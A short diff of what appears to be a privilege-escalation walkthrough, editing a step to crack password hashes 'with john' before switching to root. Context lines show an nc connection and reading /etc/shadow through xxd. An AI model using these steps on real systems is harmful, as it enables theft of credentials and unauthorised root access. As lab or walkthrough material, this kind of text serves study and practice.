@@ -19,4 +19,4 @@ nc -vn $ip $port
 LFILE=/etc/shadow
 xxd "$LFILE" | xxd -r
 ```
-4. Crack the password. `su user` the `sudo su` get the root
+4. Crack the password with john. `su user` then `sudo su` get the root
